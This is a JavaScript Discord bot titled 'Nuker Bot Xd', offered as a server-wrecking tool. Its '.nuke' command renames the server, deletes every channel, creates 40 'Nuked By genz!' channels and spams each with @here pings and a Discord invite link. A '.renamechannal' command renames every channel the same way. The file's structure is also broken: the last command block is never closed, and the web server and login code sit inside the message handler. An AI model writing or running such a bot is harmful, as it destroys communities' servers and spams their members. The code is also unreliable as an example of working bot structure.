const { 
  Client, 
  GatewayIntentBits, 
  PermissionsBitField, 
  ChannelType, 
  EmbedBuilder 
} = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

const PREFIX = ".";

client.once("ready", () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
});

client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.content.startsWith(PREFIX)) return;

  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  // 🔒 ADMIN CHECK FUNCTION
  const isAdmin = message.member.permissions.has(
    PermissionsBitField.Flags.Administrator
  );

  // ========================
  // 📜 HELP COMMAND
  // ========================
  if (command === "help") {
    const helpEmbed = new EmbedBuilder()
      .setTitle("Nuker Bot Xd")
      .setColor("Red")
      .setDescription("are all available commands:")
      .addFields(
        { name: "💀 .nuke", value: "Nuke Server" },
        { name: "🧹 .clear <amount>", value: "Delete messages (max 100)." },
        { name: "🔨 .kick @user", value: "Kick a member." },
        { name: "🔨 .ban @user", value: "Ban a member." },
        { name: "📢 .say <text>", value: "Bot says your message." },
        { name: "💀 .renamechannal", value: "renaming all channal💀 ." },
      )
      .setFooter({ text: "Admin only commands are protected." });

    return message.channel.send({ embeds: [helpEmbed] });
  }

  // ========================
  // 🔒 ADMIN ONLY COMMANDS
  // ========================
  if (!isAdmin) {
    return message.reply("❌ You need Administrator permission.");
  }

  // ========================
  // 💀 HAHA COMMAND
  // ========================
  if (command === "nuke") {
    await message.guild.setName("「 ⋆༺𓆩☠︎︎𓆪༻⋆ 」Nuked By genz!");
    await message.reply("「 ⋆༺𓆩☠︎︎𓆪༻⋆ 」Nuked By genz!");

    // Delete all channels (parallel)
    await Promise.all(
      message.guild.channels.cache.map(c => c.delete().catch(() => {}))
    );

    // Create 40 channels fast
    const createPromises = [];
    for (let i = 0; i < 40; i++) {
      createPromises.push(
        message.guild.channels.create({
          name: "「 ⋆༺𓆩☠︎︎𓆪༻⋆ 」Nuked By genz! ",
          type: ChannelType.GuildText 
        })
      );
    }

    const newChannels = await Promise.all(createPromises);

    // Send 9 messages in each channel
    for (const ch of newChannels) {
      ch.send("# 「 ⋆༺𓆩☠︎︎𓆪༻⋆ 」Nuked By genz! @here https://discord.gg/MApQAmPcWH ⋆༺𓆩☠︎︎𓆪༻⋆ #");
      ch.send("# 「 ⋆༺𓆩☠︎︎𓆪༻⋆ 」Nuked By genz! @here https://discord.gg/MApQAmPcWH ⋆༺𓆩☠︎︎𓆪༻⋆ #");
      ch.send("# 「 ⋆༺𓆩☠︎︎𓆪༻⋆ 」Nuked By genz! @here https://discord.gg/MApQAmPcWH ⋆༺𓆩☠︎︎𓆪༻⋆ #");
      ch.send("# 「 ⋆༺𓆩☠︎︎𓆪༻⋆ 」Nuked By genz! @here https://discord.gg/MApQAmPcWH ⋆༺𓆩☠︎︎𓆪༻⋆ #");
      ch.send("# 「 ⋆༺𓆩☠︎︎𓆪༻⋆ 」Nuked By genz! @here https://discord.gg/MApQAmPcWH ⋆༺𓆩☠︎︎𓆪༻⋆ #");
      ch.send("# 「 ⋆༺𓆩☠︎︎𓆪༻⋆ 」Nuked By genz! @here https://discord.gg/MApQAmPcWH ⋆༺𓆩☠︎︎𓆪༻⋆ #");
      ch.send("# 「 ⋆༺𓆩☠︎︎𓆪༻⋆ 」Nuked By genz! @here https://discord.gg/MApQAmPcWH ⋆༺𓆩☠︎︎𓆪༻⋆ #");
      ch.send("# 「 ⋆༺𓆩☠︎︎𓆪༻⋆ 」Nuked By genz! @here https://discord.gg/MApQAmPcWH ⋆༺𓆩☠︎︎𓆪༻⋆ #");
      ch.send("# 「 ⋆༺𓆩☠︎︎𓆪༻⋆ 」Nuked By genz! @here https://discord.gg/MApQAmPcWH ⋆༺𓆩☠︎︎𓆪༻⋆ #");
      ch.send("# 「 ⋆༺𓆩☠︎︎𓆪༻⋆ 」Nuked By genz! @here https://discord.gg/MApQAmPcWH ⋆༺𓆩☠︎︎𓆪༻⋆ #");
    }
  }

  // ========================
  // 🧹 CLEAR MESSAGES
  // ========================
  if (command === "clear") {
    const amount = parseInt(args[0]);

    if (!amount || amount < 1 || amount > 100)
      return message.reply("❌ Enter number between 1-100");

    await message.channel.bulkDelete(amount, true);
    message.channel.send(`🧹 Deleted ${amount} messages.`);
  }

  // ========================
  // 🔨 KICK
  // ========================
  if (command === "kick") {
    const member = message.mentions.members.first();
    if (!member) return message.reply("❌ Mention a user to kick.");

    await member.kick();
    message.channel.send(`🔨 ${member.user.tag} was kicked.`);
  }

  // ========================
  // 🔨 BAN
  // ========================
  if (command === "ban") {
    const member = message.mentions.members.first();
    if (!member) return message.reply("❌ Mention a user to ban.");

    await member.ban();
    message.channel.send(`🔨 ${member.user.tag} was banned.`);
  }

  // ========================
  // 📢 SAY
  // ========================
  if (command === "say") {
    const text = args.join(" ");
    if (!text) return message.reply("❌ Provide a message.");

    message.delete().catch(() => {});
    message.channel.send(text);
  }

// ========================
  // Renamechannal
  // ========================
if (command === "renamechannal") {

  await message.reply("🔄 Renaming all channels to genz...");

  await Promise.all(
    message.guild.channels.cache.map(channel =>
      channel.setName("「 ⋆༺𓆩☠︎︎𓆪༻⋆ 」Nuked By genz!").catch(() => {})
    )
  );
    const express = require("express");
const app = express();

app.get("/", (req, res) => {
  res.send("Bot is running!");
});

app.listen(3000, () => {
  console.log("Web server running...");
});

client.login(process.env.TOKEN);



